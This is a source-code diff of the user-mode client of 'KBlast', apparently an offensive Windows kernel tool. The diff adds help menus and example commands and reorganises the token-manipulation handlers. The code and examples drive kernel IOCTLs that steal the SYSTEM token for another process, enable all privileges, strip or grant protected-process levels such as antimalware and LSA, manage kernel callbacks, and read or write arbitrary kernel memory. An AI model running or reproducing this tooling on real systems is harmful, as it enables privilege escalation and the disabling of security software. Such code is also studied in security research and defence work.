@@ -8,6 +8,17 @@
 #include "KBlast_c_device_dispatch.hpp"
 
 
+KBLAST_HELP_MENU Generic_Cmds[8] = {
+	{L"help", L"Show this help"},
+	{L"quit", L"Quit KBlast"},
+	{L"cls", L"Clear the screen"},
+	{L"banner", L"Print KBlast banner"},
+	{L"pid", L"Show current pid"},
+	{L"time", L"Display system time"},
+	{L"version", L"Display system version information"},
+	{L"!{cmd}", L"Execute system command"}
+};
+
 KBLAST_HELP_MENU Misc_Cmds[2] = {
 	{L"bsod", L"Guess what this command does"},
 	{L"blob", L"blobs management"},
@@ -21,8 +32,8 @@ KBLAST_HELP_MENU Prot_Cmds[4] = {
 };
 
 KBLAST_HELP_MENU Tokn_Cmds[4] = {
-	{L"enable", L"Enable all privileges for a given process"},
-	{L"disable", L"Disable all privileges for a given process"},
+	{L"enablepriv", L"Enable all privileges for a given process"},
+	{L"disablepriv", L"Disable all privileges for a given process"},
 	{L"steal", L"Steal token and give it to a given process"},
 	{L"restore", L"Restore the original token of a given process"}
 };
@@ -34,10 +45,39 @@ KBLAST_HELP_MENU Call_Cmds[4] = {
 	{L"reg", L"registry kernel callbacks"}
 };
 
+
+wchar_t Call_Examples[] =
+L"$ call|process|list\n"
+L"$ call|thread|list\n"
+L"$ call|image|list\n"
+L"$ call|reg|list\n";
+
+wchar_t Tokn_Examples[] =
+L"$ tokn|enablepriv|123 - ( enable all privileges for process 123 )\n"
+L"$ tokn|disablepriv|123 - (disable all privileges for process 123 )\n"
+L"$ tokn|steal|4|123 - ( replace 123's token with System's [ 4 ] )\n"
+L"$ tokn|restore|123 - ( restore 123's token [ ! experimental ! ] )\n";
+
+wchar_t Prot_Examples[] =
+L"$ prot|wintcb|123\n"
+L"$ prot|lsa|123\n"
+L"$ prot|antimalware|123\n"
+L"$ prot|none|123\n";
+
+wchar_t Misc_Examples[] =
+L"$ misc|blob|save|90909090 - ( save the given blob [ requires a free container ] )\n"
+L"$ misc|blob|info|1 - ( dump container 1 )\n"
+L"$ misc|blob|delete|1 - ( free container 1 )\n"
+L"$ misc|read|ffffffff12121212|300 - ( read 300 bytes at the given kernel address )\n"
+L"$ misc|blob|write|ffffffff12121212|1 - ( write 1's blob at the given kernel address )\n";
+
+wchar_t Generic_Examples[] = L"No example is available for ' generic ' commands\n";
+
 void KBlast_c_module_help(HELP_MENU help)
 {
 	DWORD i = 0, maxSize = 0;
 	PKBLAST_HELP_MENU menu = 0;
+	wchar_t* examples = 0;
 
 	switch (help)
 	{
@@ -45,24 +85,35 @@ void KBlast_c_module_help(HELP_MENU help)
 		wprintf(L"\nCommands - ' call ' ( kernel callbacks interactions )\n\n");
 		menu = (PKBLAST_HELP_MENU)&Call_Cmds;
 		maxSize = 4;
+		examples = Call_Examples;
 		break;
 
 	case TOKEN:
 		wprintf(L"\nCommands - ' tokn ' ( token manipulation interactions )\n\n");
 		menu = (PKBLAST_HELP_MENU)&Tokn_Cmds;
 		maxSize = 4;
+		examples = Tokn_Examples;
 		break;
 
 	case PROTECTION:
-		wprintf(L"\nnCommands - ' prot ' ( process protection interactions )\n\n");
+		wprintf(L"\nCommands - ' prot ' ( process protection interactions )\n\n");
 		menu = (PKBLAST_HELP_MENU)&Prot_Cmds;
 		maxSize = 4;
+		examples = Prot_Examples;
 		break;
 
 	case MISC:
 		wprintf(L"\nCommands - ' misc ' ( misc functionalities. Kernel memory reading/writing interactions, etc... )\n\n");
 		menu = (PKBLAST_HELP_MENU)&Misc_Cmds;
 		maxSize = 2;
+		examples = Misc_Examples;
+		break;
+
+	case GENERIC:
+		wprintf(L"\nCommands - ' generic ' ( generic commands. Do not initiate kernel interactions )\n\n");
+		menu = (PKBLAST_HELP_MENU)&Generic_Cmds;
+		maxSize = 8;
+		examples = Generic_Examples;
 		break;
 
 	default:
@@ -75,7 +126,7 @@ void KBlast_c_module_help(HELP_MENU help)
 		{
 			wprintf(L"\t%10s:\t%s\n", menu[i].Command, menu[i].Description);
 		}
-		wprintf(L"\n");
+		wprintf(L"\nExamples:\n\n%s\n", examples);
 	}
 
 }
@@ -132,12 +183,6 @@ BOOL KBlast_c_device_dispatch_misc(wchar_t* input)
 			{
 				status = KBlast_c_blob_manage(NULL, (char*)args.arg3, NULL, BLOB_DELETE);
 			}
-			/*
-			if ((strcmp(args.arg2, "execute") == 0))
-			{
-				status = KBlast_c_blob_manage(NULL, (char*) args.arg3, BLOB_EXECUTE);
-			}
-			*/
 			if ((strcmp(args.arg2, "info") == 0))
 			{
 				status = KBlast_c_blob_manage(NULL, (char*)args.arg3, NULL, BLOB_INFO);
@@ -207,7 +252,7 @@ BOOL KBlast_c_device_dispatch_protection(wchar_t* input)
 	
 	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
 	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);
-	if ((args.arg1 != NULL) && (args.arg2 != NULL))  // don't really need to check argc
+	if ((args.arg1 != NULL) && (args.arg2 != NULL))
 	{
 		if (strcmp(args.arg1, "help") == 0)
 		{
@@ -266,48 +311,6 @@ BOOL KBlast_c_device_dispatch_protection(wchar_t* input)
 }
 
 
-BOOL KBlast_c_device_dispatch_privileges(wchar_t* input)
-{
-	BOOL status = FALSE;
-	KBLAST_COMMANDLINE_ARGUMENTS args = { 0 };
-	KBLAST_BUFFER DeviceArgs = { 0 };
-	char* realInput = 0;
-	int argc = 0;
-
-
-	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
-	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);
-
-	if ((argc > 0) && (args.arg1 != NULL) && (args.arg2 != NULL))  // don't really need to check argc
-	{
-		if (strcmp((const char*)((PUCHAR)args.arg1), "enable") == 0)
-		{
-			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
-			if (DeviceArgs.integer1 != 0)
-			{
-				printf("Privileges : full : %d\n", DeviceArgs.integer1);
-				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_PRIVILEGES_ENABLEALL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
-				// check result
-			}
-		}
-		if (strcmp((const char*)((PUCHAR)args.arg1), "disable") == 0)
-		{
-			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
-			if (DeviceArgs.integer1 != 0)
-			{
-				printf("Privileges : none : %d\n", DeviceArgs.integer1);
-				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_PRIVILEGES_DISABLEALL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
-				// check result
-			}
-		}
-	}
-
-	KBlast_c_utils_FreeAnsiString(realInput);
-
-	return status;
-}
-
-
 BOOL KBlast_c_device_dispatch_token(wchar_t* input)
 {
 	BOOL status = FALSE;
@@ -319,11 +322,31 @@ BOOL KBlast_c_device_dispatch_token(wchar_t* input)
 
 	realInput = KBlast_c_utils_UnicodeStringToAnsiString(input);
 	argc = KBlast_c_utils_GetCommandLineArguments(realInput, 0x7C, &args);
-	if ((argc > 0) && (args.arg1 != NULL) && (args.arg2 != NULL) && (args.arg3 != NULL)) // don't really need to check argc
+	if ((args.arg1 != NULL) && (args.arg2 != NULL) /* && (args.arg3 != NULL)*/) // don't really need to check argc
 	{
 		if (strcmp(args.arg1, "help") == 0)
 		{
 			KBlast_c_module_help(TOKEN);
+		}
+		if (strcmp((const char*)((PUCHAR)args.arg1), "enablepriv") == 0)
+		{
+			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
+			if (DeviceArgs.integer1 != 0)
+			{
+				printf("Privileges : full : %d\n", DeviceArgs.integer1);
+				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_PRIVILEGES_ENABLEALL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
+				// check result
+			}
+		}
+		if (strcmp((const char*)((PUCHAR)args.arg1), "disablepriv") == 0)
+		{
+			DeviceArgs.integer1 = atoi((const char*)((PUCHAR)args.arg2));
+			if (DeviceArgs.integer1 != 0)
+			{
+				printf("Privileges : none : %d\n", DeviceArgs.integer1);
+				status = KBlast_c_device_control(KBLAST_IOCTL_TOKEN_PRIVILEGES_DISABLEALL, &DeviceArgs, sizeof(KBLAST_BUFFER), NULL, NULL);
+				// check result
+			}
 		}
 		if (strcmp((const char*)((PUCHAR)args.arg1), "steal") == 0)
 		{
